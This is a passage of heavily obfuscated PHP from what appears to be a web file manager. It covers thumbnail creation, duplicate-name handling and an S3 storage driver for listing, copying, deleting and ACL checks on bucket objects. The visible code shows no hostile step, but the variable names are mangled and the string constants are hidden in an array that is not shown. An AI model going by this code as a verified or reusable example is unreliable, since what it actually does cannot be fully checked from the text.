$­¢¾÷ñÂ[$Ò¥ÙšÓ[169]] == $Ò¥ÙšÓ[189]) { return $this->fileOut($¢»Ê¿Ù¤, !1, $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]]); } $ÊŒ£‘Ê¢ = kodIO::hashPath($­¢¾÷ñÂ); $„ÖÖãæ– = "\x63\x6f\x76\145\x72\137{$ÊŒ£‘Ê¢}\x5f{$±ó¥˜­·}\56\x70\x6e\x67"; $ÌÜ—×©¯ = IO_PATH_SYSTEM_TEMP . $Ò¥ÙšÓ[190]; $Å²–ãÖ‹ = IO::infoFullSimple($ÌÜ—×©¯); $ÜÛ¾ÙŸ = $Å²–ãÖ‹ && is_array($Å²–ãÖ‹) ? $Å²–ãÖ‹[$Ò¥ÙšÓ[87]] : $Ò¥ÙšÓ[12]; if (!$ÜÛ¾ÙŸ) { $ÜÛ¾ÙŸ = IO::mkdir($ÌÜ—×©¯); } if ($­¢¾÷ñÂ[$Ò¥ÙšÓ[191]] == $Ò¥ÙšÓ[192] && isset($­¢¾÷ñÂ[$Ò¥ÙšÓ[193]]) && $­¢¾÷ñÂ[$Ò¥ÙšÓ[193]] == kodIO::sourceID($ÜÛ¾ÙŸ)) { $£‹úÀ‘û = $­¢¾÷ñÂ[$Ò¥ÙšÓ[194]]; if ($±ó¥˜­· <= 500) { $ˆ¥À¿â = preg_replace($Ò¥ÙšÓ[195], $Ò¥ÙšÓ[196], $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]]); $£‹úÀ‘û = IO::fileNameExist($ÜÛ¾ÙŸ, $ˆ¥À¿â); } return IO::fileOut(KodIO::make($£‹úÀ‘û), !1, $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]]); } $óµÜ÷«‹ = IO::fileNameExist($ÜÛ¾ÙŸ, $„ÖÖãæ–); if ($óµÜ÷«‹) { return IO::fileOut(KodIO::make($óµÜ÷«‹), !1, $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]]); } if ($±ó¥˜­· > 1000) { $this->makeImageCover($ÜÛ¾ÙŸ, $¢»Ê¿Ù¤, $„ÖÖãæ–, $±ó¥˜­·); $this->makeImageCover($ÜÛ¾ÙŸ, $¢»Ê¿Ù¤, "\143\x6f\166\x65\162\x5f{$ÊŒ£‘Ê¢}\x5f\62\x35\60\x2e\x70\x6e\147", 250); $óµÜ÷«‹ = IO::fileNameExist($ÜÛ¾ÙŸ, $„ÖÖãæ–); if ($óµÜ÷«‹) { return IO::fileOut(KodIO::make($óµÜ÷«‹), !1, $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]]); } die; } if (!kodIO::allowCover($­¢¾÷ñÂ)) { return $this->fileOut($¢»Ê¿Ù¤, !1, $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]]); } $ïò®æŸ = Cache::get($„ÖÖãæ–); if ($ïò®æŸ == $Ò¥ÙšÓ[197] || $ïò®æŸ == $Ò¥ÙšÓ[198]) { echo $ïò®æŸ; die; } Cache::set($„ÖÖãæ–, $Ò¥ÙšÓ[198], 60); $‡—éÂ‰Ù = array($ÜÛ¾ÙŸ, $­¢¾÷ñÂ[$Ò¥ÙšÓ[87]], $„ÖÖãæ–, $±ó¥˜­·); $æˆÔĞÃñ = $Ò¥ÙšÓ[199] . $­¢¾÷ñÂ[$Ò¥ÙšÓ[79]] . $Ò¥ÙšÓ[200] . $„ÖÖãæ– . $Ò¥ÙšÓ[201] . $­¢¾÷ñÂ[$Ò¥ÙšÓ[32]] . $Ò¥ÙšÓ[202] . $­¢¾÷ñÂ[$Ò¥ÙšÓ[87]]; TaskQueue::add($Ò¥ÙšÓ[203], $‡—éÂ‰Ù, $æˆÔĞÃñ, $„ÖÖãæ–); } public function makeImageCover($ùë»‰²ó, $†—µ˜², $ó¤šÖİ‹, $ö³Ùò) { $ºÊ§½«” =& $_SERVER[ÅÄÇĞô]; if (IO::fileNameExist($ùë»‰²ó, $ó¤šÖİ‹)) { return $ºÊ§½«”[204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $«ˆó’”¥ = $this->getPathOuter($†—µ˜²); $ø›˜¤“¤ = DATA_THUMB . $ó¤šÖİ‹; del_file($ø›˜¤“¤); $Ïòã‡æ¼ = IO::copy($«ˆó’”¥, TEMP_FILES, !1, $ó¤šÖİ‹); if (!@file_exists($Ïòã‡æ¼)) { return $ºÊ§½«”[205]; } ImageThumb::createThumb($Ïòã‡æ¼, $ø›˜¤“¤, $ö³Ùò, $ö³Ùò * 10); if (@file_exists($ø›˜¤“¤)) { Cache::remove($ó¤šÖİ‹); return IO::move($ø›˜¤“¤, $ùë»‰²ó); } Cache::set($ó¤šÖİ‹, $ºÊ§½«”[197], 600); del_file($ø›˜¤“¤); return $ºÊ§½«”[206] . $Ïòã‡æ¼ . $ºÊ§½«”[74]; } public function fileOutImageServer($˜¯›‰æÔ, $–©ÎÙ¡ = 250) { $this->fileOutImage($˜¯›‰æÔ, $–©ÎÙ¡); } public function fileNameAuto($™Ü˜‚, $€’ÉŸèš, $¼¯ÌÕï = REPEAT_RENAME, $ó’áé¶ = false) { $¸’ÊŞ‘ =& $_SERVER[ÅÄÇĞô]; $½ÀÅ¶¹à = $™Ü˜‚ === $¸’ÊŞ‘[12] ? $€’ÉŸèš : rtrim($™Ü˜‚, $¸’ÊŞ‘[8]) . $¸’ÊŞ‘[8] . $€’ÉŸèš; if ($¼¯ÌÕï == REPEAT_REPLACE || !$this->exist($½ÀÅ¶¹à) || $ó’áé¶ && $¼¯ÌÕï != REPEAT_RENAME_FOLDER) { return $€’ÉŸèš; } if ($¼¯ÌÕï == REPEAT_SKIP) { return !1; } $‰³äİ°© = $¸’ÊŞ‘[10] . get_path_ext($€’ÉŸèš); $‰³äİ°© = $‰³äİ°© == $¸’ÊŞ‘[10] || $ó’áé¶ ? $¸’ÊŞ‘[12] : $‰³äİ°©; $ş¨‚€¶Ù = 1; $°Ş˜ºú© = substr($€’ÉŸèš, 0, strlen($€’ÉŸèš) - strlen($‰³äİ°©)); $—â¼‡»„ = $°Ş˜ºú© . "\50{$ş¨‚€¶Ù}\51{$‰³äİ°©}"; while ($this->exist(rtrim($™Ü˜‚, $¸’ÊŞ‘[8]) . $¸’ÊŞ‘[8] . $—â¼‡»„)) { $—â¼‡»„ = $°Ş˜ºú© . "\50{$ş¨‚€¶Ù}\x29{$‰³äİ°©}"; $ş¨‚€¶Ù++; } return $—â¼‡»„; } private function fileNameAutoList($Òà·Ì§, $µ½©¬§Ê, $•³’³Ä‡ = false) { $ß‚ØÃ€ =& $_SERVER[ÅÄÇĞô]; $–ÚË½½Õ = $this->listPath($Òà·Ì§, !0); $–ÚË½½Õ = array_merge($–ÚË½½Õ[$ß‚ØÃ€[85]], $–ÚË½½Õ[$ß‚ØÃ€[86]]); $¯éÅ¼³ = array_to_keyvalue($–ÚË½½Õ, $ß‚ØÃ€[12], $ß‚ØÃ€[32]); $«½ş¬Û‰ = $ß‚ØÃ€[10] . get_path_ext($µ½©¬§Ê); $«½ş¬Û‰ = $«½ş¬Û‰ == $ß‚ØÃ€[10] || $•³’³Ä‡ ? $ß‚ØÃ€[12] : $«½ş¬Û‰; $ñõÒ¹ò = substr($µ½©¬§Ê, 0, strlen($µ½©¬§Ê) - strlen($«½ş¬Û‰)); $¶Â…í—º = $ñõÒ¹ò . "\50\x30\51{$«½ş¬Û‰}"; for ($±ÆÏÑÄ° = 1; $±ÆÏÑÄ° <= count($¯éÅ¼³) + 1; $±ÆÏÑÄ°++) { $¶Â…í—º = $ñõÒ¹ò . "\50{$±ÆÏÑÄ°}\x29{$«½ş¬Û‰}"; if (!in_array_not_case($¶Â…í—º, $¯éÅ¼³)) { return $¶Â…í—º; } } return $¶Â…í—º; } public function listAllFiles($‡öÆºœ’, $ØÂ˜ƒÇ) { $õ»ÉÙ´Ì =& $_SERVER[ÅÄÇĞô]; if (empty($ØÂ˜ƒÇ)) { return array(); } $ §—Ñ‚ = array_keys($ØÂ˜ƒÇ); $Â©Ì‰ï = array(); $‡öÆºœ’ = trim($‡öÆºœ’, $õ»ÉÙ´Ì[8]); foreach ($ØÂ˜ƒÇ as $¤İÉŞ‘ü => $¶°ƒüì) { $ĞüÔÒï¹ = ltrim(substr(trim($¤İÉŞ‘ü, $õ»ÉÙ´Ì[8]), strlen($‡öÆºœ’)), $õ»ÉÙ´Ì[8]); if (substr($¤İÉŞ‘ü, -1) == $õ»ÉÙ´Ì[8]) { $ĞüÔÒï¹ = rtrim($ĞüÔÒï¹, $õ»ÉÙ´Ì[8]) . $õ»ÉÙ´Ì[8]; } $Â©Ì‰ï = array_merge($Â©Ì‰ï, $this->slicePath($ĞüÔÒï¹)); } $·İ·Şƒ = array(); foreach (array_unique($Â©Ì‰ï) as $·ïÅı¡Î) { $³ÎûŒ¼å = array($õ»ÉÙ´Ì[87] => $this->getPathOuter($õ»ÉÙ´Ì[8] . $‡öÆºœ’ . $õ»ÉÙ´Ì[8] . $·ïÅı¡Î), $õ»ÉÙ´Ì[78] => 1, $õ»ÉÙ´Ì[79] => 0); if (substr($·ïÅı¡Î, -1) != $õ»ÉÙ´Ì[8]) { $³ÎûŒ¼å[$õ»ÉÙ´Ì[78]] = 0; $«š²Ğ¬Ç = $this->getPath($‡öÆºœ’ . $õ»ÉÙ´Ì[8] . $·ïÅı¡Î); if (isset($ØÂ˜ƒÇ[$«š²Ğ¬Ç])) { $•ßÆ¬ŠÒ = $ØÂ˜ƒÇ[$«š²Ğ¬Ç]; if (isset($•ßÆ¬ŠÒ[$õ»ÉÙ´Ì[79]])) { $³ÎûŒ¼å[$õ»ÉÙ´Ì[79]] = intval($•ßÆ¬ŠÒ[$õ»ÉÙ´Ì[79]]); } if (isset($•ßÆ¬ŠÒ[$õ»ÉÙ´Ì[207]])) { $³ÎûŒ¼å[$õ»ÉÙ´Ì[88]] = intval($•ßÆ¬ŠÒ[$õ»ÉÙ´Ì[207]]); } } } $·İ·Şƒ[] = $³ÎûŒ¼å; } return $·İ·Şƒ; } public function slicePath($ø‰œ³…Â) { $×’Öõõá =& $_SERVER[ÅÄÇĞô]; $¤ÕĞêŒ = explode($×’Öõõá[8], trim($ø‰œ³…Â, $×’Öõõá[8])); $’´˜í‰¯ = 0; do { ++$’´˜í‰¯; $ˆêÉû¾Ò[] = implode($×’Öõõá[8], array_slice($¤ÕĞêŒ, 0, $’´˜í‰¯)) . $×’Öõõá[8]; } while ($’´˜í‰¯ < count($¤ÕĞêŒ)); $ˆêÉû¾Ò[count($¤ÕĞêŒ) - 1] = $ø‰œ³…Â; return $ˆêÉû¾Ò; } public function getHost() { $–”ÁÏÌ =& $_SERVER[ÅÄÇĞô]; $ÄĞ·Ş× = parse_url(trim($this->domain, $–”ÁÏÌ[8])); $Ú—¾³î = isset($ÄĞ·Ş×[$–”ÁÏÌ[208]]) ? $ÄĞ·Ş×[$–”ÁÏÌ[208]] : http_type(); $ßçæ°ıõ = isset($ÄĞ·Ş×[$–”ÁÏÌ[209]]) ? $ÄĞ·Ş×[$–”ÁÏÌ[209]] : $ÄĞ·Ş×[$–”ÁÏÌ[87]]; if (isset($ÄĞ·Ş×[$–”ÁÏÌ[210]])) { $ßçæ°ıõ .= $–”ÁÏÌ[4] . $ÄĞ·Ş×[$–”ÁÏÌ[210]]; } return $Ú—¾³î . $–”ÁÏÌ[211] . $ßçæ°ıõ; } public function pathEncode($·ˆÏƒ¸) { $±õÇÓÔó =& $_SERVER[ÅÄÇĞô]; return str_replace($±õÇÓÔó[212], $±õÇÓÔó[8], rawurlencode($·ˆÏƒ¸)); } public function writeLog($ÈêĞß¸ = '', $€èß„È = false) { $¢”ŸìÃù =& $_SERVER[ÅÄÇĞô]; $£ŞêàÖ¼ = in_array(ACTION, array($¢”ŸìÃù[213], $¢”ŸìÃù[214])); if (!$£ŞêàÖ¼ && !GLOBAL_DEBUG) { return; } $ñ˜şİÓ¦ = $ÈêĞß¸; static $î õï¹š = null; if (!$î õï¹š) { $î õï¹š = strtoupper($this->getType()); } $ÈêĞß¸ = $î õï¹š . $¢”ŸìÃù[215] . $ÈêĞß¸; if ($€èß„È) { $Ş³í×…› = error_get_last(); if ($Ş³í×…›) { $ÈêĞß¸ = array($ÈêĞß¸, $Ş³í×…›); } } write_log($ÈêĞß¸, $¢”ŸìÃù[216]); if ($£ŞêàÖ¼) { throw new Exception($ñ˜şİÓ¦); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Íç»Êİ) { set_timeout(); require_once SDK_DIR . $_SERVER[ÅÄÇĞô][217]; parent::__construct(); $this->_init($Íç»Êİ); } public function _init($˜èˆî”¨) { $´„Ñ’û² =& $_SERVER[ÅÄÇĞô]; $this->config = $˜èˆî”¨; foreach ($˜èˆî”¨ as $‡Üãæ¯° => $ÏÚ¿ª¹) { if (isset($this->{$‡Üãæ¯°})) { $this->{$‡Üãæ¯°} = $ÏÚ¿ª¹; } } $this->endpoint = $˜èˆî”¨[$´„Ñ’û²[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $øÚÎÆŞı = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($øÚÎÆŞı, 0, 7) == $´„Ñ’û²[219]) { $øÚÎÆŞı = $´„Ñ’û²[220] . substr($øÚÎÆŞı, 7); } $this->client->setEndpoint($øÚÎÆŞı); if (in_array(ACTION, array($´„Ñ’û²[213], $´„Ñ’û²[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ÜïÓ¢Ë = "\166\x34") { $this->signVer = $ÜïÓ¢Ë; $this->client->setSignVersion($ÜïÓ¢Ë); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $¡•½˜™) { return null; } } public function isBucketCors() { $™àÙÏ‘ =& $_SERVER[ÅÄÇĞô]; $¤Ø™È¹ = $this->getBucketCors(); if (!$¤Ø™È¹ || !is_array($¤Ø™È¹)) { return !1; } if (!is_array($¤Ø™È¹[$™àÙÏ‘[221]])) { $¤Ø™È¹[$™àÙÏ‘[221]] = explode($™àÙÏ‘[50], $¤Ø™È¹[$™àÙÏ‘[221]]); } if ($¤Ø™È¹[$™àÙÏ‘[222]] != $™àÙÏ‘[223] || !in_array($™àÙÏ‘[223], $¤Ø™È¹[$™àÙÏ‘[221]])) { return !1; } $ò÷¯ˆ = array_map($™àÙÏ‘[224], $¤Ø™È¹[$™àÙÏ‘[225]]); if (!is_array($ò÷¯ˆ)) { $ò÷¯ˆ = array(); } $Ğ¹óÒı = array($™àÙÏ‘[226], $™àÙÏ‘[227], $™àÙÏ‘[228], $™àÙÏ‘[229], $™àÙÏ‘[230]); $äáÖÀß = array_diff($Ğ¹óÒı, $ò÷¯ˆ); return empty($äáÖÀß); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($åÕöÊ„, $ÉìÎÁËú = '', $×¾ ©§õ = REPEAT_RENAME) { $§€Æ½¢Š = $this->setContent($åÕöÊ„, $ÉìÎÁËú); if ($§€Æ½¢Š !== !1) { return $this->getPathOuter($åÕöÊ„); } return !1; } public function mkdir($’¤®µÏ, $ Âòù¶ó = REPEAT_SKIP) { $½ñšñ·Ä =& $_SERVER[ÅÄÇĞô]; if (empty($’¤®µÏ) && $’¤®µÏ !== $½ñšñ·Ä[231]) { return !1; } if ($ Âòù¶ó && $this->_isFolder($’¤®µÏ)) { return $this->getPathOuter($’¤®µÏ); } $€ıÈ‰û = $this->setContent($’¤®µÏ, $½ñšñ·Ä[12], !0); if ($€ıÈ‰û !== !1) { return $this->getPathOuter($’¤®µÏ); } return !1; } public function copyFile($Øû§Îæö, $öº¸÷±, $¬ÄŞ©©â = array()) { $¨ù¯ŒÍ… =& $_SERVER[ÅÄÇĞô]; $Æñö‰™í = $this->objectMeta($Øû§Îæö); if (!$Æñö‰™í) { return !1; } if ($Æñö‰™í[$¨ù¯ŒÍ…[79]] <= 1024 * 1024 * 200) { $±¤ËÃİé = $this->client->copyObject($this->bucket, $Øû§Îæö, $this->bucket, $öº¸÷±, $¨ù¯ŒÍ…[232], $¬ÄŞ©©â); } else { $±¤ËÃİé = $this->client->multiCopyObject($this->bucket, $Øû§Îæö, $this->bucket, $öº¸÷±, $¬ÄŞ©©â); } $±¤ËÃİé = $±¤ËÃİé ? $this->getPathOuter($öº¸÷±) : !1; return $±¤ËÃİé; } public function moveFile($Ó¦ÃÙ™ç, $îşêÏ‘) { if ($this->copyFile($Ó¦ÃÙ™ç, $îşêÏ‘)) { $this->delFile($Ó¦ÃÙ™ç); return $this->getPathOuter($îşêÏ‘); } return !1; } public function delFile($ªÇµü½Õ) { return $this->client->deleteObject($this->bucket, $ªÇµü½Õ); } public function delFolder($¬À«ô¹) { $ÃÂšëÍ¼ =& $_SERVER[ÅÄÇĞô]; if (!$this->exist($¬À«ô¹)) { return !0; } $this->listItemCache = !1; $ì¾àåÉ§ = $this->fileList($¬À«ô¹); $this->listItemCache = !0; $å„¨ğîÏ = trim($¬À«ô¹, $ÃÂšëÍ¼[8]) . $ÃÂšëÍ¼[8]; if (!empty($¬À«ô¹) && $¬À«ô¹ !== $ÃÂšëÍ¼[231] && !in_array($å„¨ğîÏ, $ì¾àåÉ§[$ÃÂšëÍ¼[85]])) { $ì¾àåÉ§[$ÃÂšëÍ¼[85]][] = $å„¨ğîÏ; } $±Ğ¾•Ğ = $this->delByBatch($ì¾àåÉ§[$ÃÂšëÍ¼[86]]); if (!$±Ğ¾•Ğ) { return !1; } $±Ğ¾•Ğ = $this->delByBatch($ì¾àåÉ§[$ÃÂšëÍ¼[85]]); if (!$±Ğ¾•Ğ) { return !1; } return $this->delFile($å„¨ğîÏ); } private function delByBatch($Õ²’ÍŞ¹) { foreach (array_chunk($Õ²’ÍŞ¹, 1000) as $İª˜Ù¨Ó) { $İÓ¡Øœª = $this->client->deleteObjects($this->bucket, $İª˜Ù¨Ó); if (!$İÓ¡Øœª) { return !1; } } return !0; } public function rename($ëÇùÒ¡, $à…Èşİ) { return $this->renameObject($ëÇùÒ¡, $à…Èşİ); } public function listPath($„§•³š, $ÙÄ¦ì† = false) { $ç½ÆŸ›í =& $_SERVER[ÅÄÇĞô]; $¢‡øÉú… = $this->fileList($„§•³š, $ç½ÆŸ›í[8], !0); foreach ($¢‡øÉú…[$ç½ÆŸ›í[85]] as $ñ¹€ûÉ => $–ŸñÒê°) { $¢‡øÉú…[$ç½ÆŸ›í[85]][$ñ¹€ûÉ] = $this->folderInfo($–ŸñÒê°, $ÙÄ¦ì†, $–ŸñÒê°); } foreach ($¢‡øÉú…[$ç½ÆŸ›í[86]] as $ñ¹€ûÉ => $–ŸñÒê°) { $¢‡øÉú…[$ç½ÆŸ›í[86]][$ñ¹€ûÉ] = $this->fileInfo($–ŸñÒê°[$ç½ÆŸ›í[32]], $ÙÄ¦ì†, $–ŸñÒê°); } return $¢‡øÉú…; } protected function infoChildren($Ï¤Ÿ ×Î, &$¥¹¢ÜÈœ) { $ÊÚ·—Şß =& $_SERVER[ÅÄÇĞô]; $®„İì±İ = $this->fileList($Ï¤Ÿ ×Î, $ÊÚ·—Şß[12], !0); $¥¹¢ÜÈœ[$ÊÚ·—Şß[81]] += count($®„İì±İ[$ÊÚ·—Şß[85]]); $¥¹¢ÜÈœ[$ÊÚ·—Şß[80]] += count($®„İì±İ[$ÊÚ·—Şß[86]]); foreach ($®„İì±İ[$ÊÚ·—Şß[86]] as $³Úß²¥‘) { if (!$³Úß²¥‘ || !$³Úß²¥‘[$ÊÚ·—Şß[79]]) { continue; } $¥¹¢ÜÈœ[$ÊÚ·—Şß[79]] += $³Úß²¥‘[$ÊÚ·—Şß[79]]; } } private function fileInfo($Ã‡­Ä, $´Úî Ñ = false, $û‘º‡¯” = array()) { $Ûüª¾û— =& $_SERVER[ÅÄÇĞô]; $°ôïˆ’Ì = array($Ûüª¾û—[32] => $this->pathThis($Ã‡­Ä), $Ûüª¾û—[87] => $this->getPathOuter($Ã‡­Ä), $Ûüª¾û—[33] => $Ûüª¾û—[233], $Ûüª¾û—[169] => $this->ext($Ã‡­Ä), $Ûüª¾û—[79] => isset($û‘º‡¯”[$Ûüª¾û—[79]]) ? $û‘º‡¯”[$Ûüª¾û—[79]] : 0); if ($´Úî Ñ) { return $°ôïˆ’Ì; } $°ôïˆ’Ì[$Ûüª¾û—[234]] = $°ôïˆ’Ì[$Ûüª¾û—[88]] = 0; $°ôïˆ’Ì[$Ûüª¾û—[235]] = $°ôïˆ’Ì[$Ûüª¾û—[236]] = !0; if (empty($û‘º‡¯”)) { $û‘º‡¯” = $this->objectMeta($Ã‡­Ä); if (!$û‘º‡¯”) { return $°ôïˆ’Ì; } } if (isset($û‘º‡¯”[$Ûüª¾û—[237]]) && $û‘º‡¯”[$Ûüª¾û—[237]]) { $°ôïˆ’Ì[$Ûüª¾û—[238]] = $û‘º‡¯”[$Ûüª¾û—[237]]; } if (isset($û‘º‡¯”[$Ûüª¾û—[207]])) { $°ôïˆ’Ì[$Ûüª¾û—[88]] = $û‘º‡¯”[$Ûüª¾û—[207]]; } if (isset($û‘º‡¯”[$Ûüª¾û—[79]])) { $°ôïˆ’Ì[$Ûüª¾û—[79]] = $û‘º‡¯”[$Ûüª¾û—[79]]; } return $°ôïˆ’Ì; } private function folderInfo($®ÜƒÚ·–, $¸˜áÊíë = false, $ıã×Ìò¥ = array()) { $¿÷ÛÁ‘Ã =& $_SERVER[ÅÄÇĞô]; $ò¿í¾ÊÍ = array($¿÷ÛÁ‘Ã[32] => $this->pathThis($®ÜƒÚ·–), $¿÷ÛÁ‘Ã[87] => $this->getPathOuter($¿÷ÛÁ‘Ã[8] . $®ÜƒÚ·–), $¿÷ÛÁ‘Ã[33] => $¿÷ÛÁ‘Ã[78]); if ($¸˜áÊíë) { return $ò¿í¾ÊÍ; } $ò¿í¾ÊÍ[$¿÷ÛÁ‘Ã[234]] = $ò¿í¾ÊÍ[$¿÷ÛÁ‘Ã[88]] = 0; $ò¿í¾ÊÍ[$¿÷ÛÁ‘Ã[235]] = $ò¿í¾ÊÍ[$¿÷ÛÁ‘Ã[236]] = !0; if ($®ÜƒÚ·– == $¿÷ÛÁ‘Ã[12]) { return $ò¿í¾ÊÍ; } if (empty($ıã×Ìò¥)) { $ıã×Ìò¥ = $this->objectMeta(trim($®ÜƒÚ·–, $¿÷ÛÁ‘Ã[8]) . $¿÷ÛÁ‘Ã[8]); } if (isset($ıã×Ìò¥[$¿÷ÛÁ‘Ã[207]])) { $ò¿í¾ÊÍ[$¿÷ÛÁ‘Ã[234]] = $ıã×Ìò¥[$¿÷ÛÁ‘Ã[207]]; } return $ò¿í¾ÊÍ; } private function fileList($ª€Šãßş, $°Ø‹Âş = '', $©íëÁ– = 0) { $ƒ£„¥µĞ =& $_SERVER[ÅÄÇĞô]; $ÔÃü–åÖ = rtrim($ª€Šãßş, $ƒ£„¥µĞ[8]) . $ƒ£„¥µĞ[8]; $„ìîÓ±ô = $this->listObjs($ÔÃü–åÖ, null, null, $°Ø‹Âş); if (!$„ìîÓ±ô) { return array($ƒ£„¥µĞ[85] => array(), $ƒ£„¥µĞ[86] => array()); } $ŠÊÜ–Š® = $›ãçãÖà = array(); foreach ($„ìîÓ±ô[$ƒ£„¥µĞ[239]] as $§öŒşØ®) { $Ã·¦éà = $§öŒşØ®[$ƒ£„¥µĞ[32]]; if ($Ã·¦éà == $ÔÃü–åÖ) { continue; } $¾Üà‡ô = isset($§öŒşØ®[$ƒ£„¥µĞ[79]]) ? $§öŒşØ®[$ƒ£„¥µĞ[79]] : 0; $ÚÊ³û— = $¾Üà‡ô == 0 && substr($Ã·¦éà, strlen($Ã·¦éà) - 1, 1) == $ƒ£„¥µĞ[8] ? !0 : !1; $this->cacheMethodInfoSet($Ã·¦éà, $ÚÊ³û—, $§öŒşØ®); if ($ÚÊ³û—) { $ŠÊÜ–Š®[] = $Ã·¦éà; continue; } $›ãçãÖà[] = $©íëÁ– ? $§öŒşØ® : $Ã·¦éà; } foreach ($„ìîÓ±ô[$ƒ£„¥µĞ[240]] as $§öŒşØ®) { $ŠÊÜ–Š®[] = $§öŒşØ®[$ƒ£„¥µĞ[32]]; $this->cacheMethodInfoSet($§öŒşØ®[$ƒ£„¥µĞ[32]], !0); } $this->cacheMethodInfoSet($ª€Šãßş, !0); return array($ƒ£„¥µĞ[85] => $ŠÊÜ–Š®, $ƒ£„¥µĞ[86] => $›ãçãÖà); } private function listObjs($‹§„ÕíÊ, $ËÇŞÏŠ = null, $ÃÆàÕ¤° = null, $¥ÕİÆù‘ = null) { $÷ ´Õ› =& $_SERVER[ÅÄÇĞô]; $‹§„ÕíÊ = trim($‹§„ÕíÊ, $÷ ´Õ›[8]); $Ü÷§Ûßí = empty($‹§„ÕíÊ) && $‹§„ÕíÊ !== $÷ ´Õ›[231] ? $÷ ´Õ›[12] : $‹§„ÕíÊ . $÷ ´Õ›[8]; return $this->client->getBucket($this->bucket, $Ü÷§Ûßí, $ËÇŞÏŠ, $ÃÆàÕ¤°, $¥ÕİÆù‘, !0); } public function has($Ïøğş¥ş, $ê„¼†êÀ = false, $˜Ëçì†ì = true) { $¥°ßğÏş =& $_SERVER[ÅÄÇĞô]; $Ïøğş¥ş = trim($Ïøğş¥ş, $¥°ßğÏş[8]); $Ù«®›ô = empty($Ïøğş¥ş) && $Ïøğş¥ş !== $¥°ßğÏş[231] ? $¥°ßğÏş[12] : $Ïøğş¥ş . $¥°ßğÏş[8]; $»ûî£ = null; $ÒñØÌÚá = 500; $Ï°Ïñì = $¥°ßğÏş[8]; $¸ƒàª¢¸ = $°ıÁ³÷ = array(); while (!0) { $€¼«³´æ = $this->listObjs($Ïøğş¥ş, $»ûî£, $ÒñØÌÚá, $Ï°Ïñì); if (!$€¼«³´æ) { break; } $»ûî£ = $€¼«³´æ[$¥°ßğÏş[241]]; $ñÉÖ²ùˆ = $€¼«³´æ[$¥°ßğÏş[239]]; $ïÃ¿ ×÷ = $€¼«³´æ[$¥°ßğÏş[240]]; if (empty($ñÉÖ²ùˆ) && empty($ïÃ¿ ×÷)) { break; } if (count($ñÉÖ²ùˆ) == 1 && $ñÉÖ²ùˆ[0][$¥°ßğÏş[32]] == $Ù«®›ô) { break; } if ($ê„¼†êÀ) { if (count($ñÉÖ²ùˆ)) { $ñÉÖ²ùˆ = array_column($ñÉÖ²ùˆ, $¥°ßğÏş[32]); $¸ƒàª¢¸ = array_merge($¸ƒàª¢¸, $ñÉÖ²ùˆ); } if (count($ïÃ¿ ×÷)) { $ïÃ¿ ×÷ = array_column($ïÃ¿ ×÷, $¥°ßğÏş[32]); $°ıÁ³÷ = array_merge($°ıÁ³÷, $ïÃ¿ ×÷); } if ($»ûî£ === null) { break; } continue; } if ($˜Ëçì†ì) { if (!empty($ñÉÖ²ùˆ)) { if (count($ñÉÖ²ùˆ) > 1 || isset($ñÉÖ²ùˆ[0][$¥°ßğÏş[32]]) && $ñÉÖ²ùˆ[0][$¥°ßğÏş[32]] != $Ù«®›ô) { return !0; } } } else { if (!empty($ïÃ¿ ×÷)) { return !0; } } if ($»ûî£ === null) { break; } } if ($ê„¼†êÀ) { $¸ƒàª¢¸ = array_diff($¸ƒàª¢¸, array($Ù«®›ô)); $¸ƒàª¢¸ = count(array_unique($¸ƒàª¢¸)); $°ıÁ³÷ = count(array_unique($°ıÁ³÷)); return array($¥°ßğÏş[242] => $¸ƒàª¢¸, $¥°ßğÏş[243] => $°ıÁ³÷); } return !1; } public function listAll($Şã¼ÑÒ”) { $£­Åşª¨ =& $_SERVER[ÅÄÇĞô]; $¡àÈ¹Ì = $this->fileList($Şã¼ÑÒ”, $£­Åşª¨[12], !0); $Â²¶Š = array_to_keyvalue($¡àÈ¹Ì[$£­Åşª¨[86]], $£­Åşª¨[32]); foreach ($¡àÈ¹Ì[$£­Åşª¨[85]] as $­Èôß•) { if (is_string($­Èôß•)) { $Â²¶Š[$­Èôß•] = array($£­Åşª¨[79] => 0); } } return $this->listAllFiles($Şã¼ÑÒ”, $Â²¶Š); } public function canRead($‰ÑÚåÚ) { $¨¾º–èÕ =& $_SERVER[ÅÄÇĞô]; $áâ÷‘Ì¹ = $this->client->getAccessControlPolicy($this->bucket, $‰ÑÚåÚ); if (!$áâ÷‘Ì¹) { return !1; } return in_array($áâ÷‘Ì¹, array($¨¾º–èÕ[244], $¨¾º–èÕ[245], $¨¾º–èÕ[246])) ? !0 : !1; } public function canWrite($ó‚Áß–‹) { $¥©Êöæ× =& $_SERVER[ÅÄÇĞô]; $Ç˜ö ˜½ = $this->client->getAccessControlPolicy($this->bucket, $ó‚Áß–‹); if (!$Ç˜ö ˜½) { return !1; } return in_array($Ç˜ö ˜½, array($¥©Êöæ×[244], $¥©Êöæ×[245])) ? !0 : !1; } public function getContent($æˆÈ¡ š) { return $this->client->getObject($this->bucket, $æˆÈ¡ š); } public function setContent($Ä¡¨»¡¼, $µé¾ÇÛÕ = '', $¿‹¤”ÉÍ = false) { $Ãõ¯“÷½ =& $_SERVER[ÅÄÇĞô]; $Ä¡¨»¡¼ = $¿‹¤”ÉÍ ? trim($Ä¡¨»¡¼, $Ãõ¯“÷½[8]) . $Ãõ¯“÷½[8] : $Ä¡¨»¡¼; $èÅïÃÈ = get_file_mime(get_path_ext($Ä¡¨»¡¼)); $™Î¦©ü² = $this->client->putObject($µé¾ÇÛÕ, 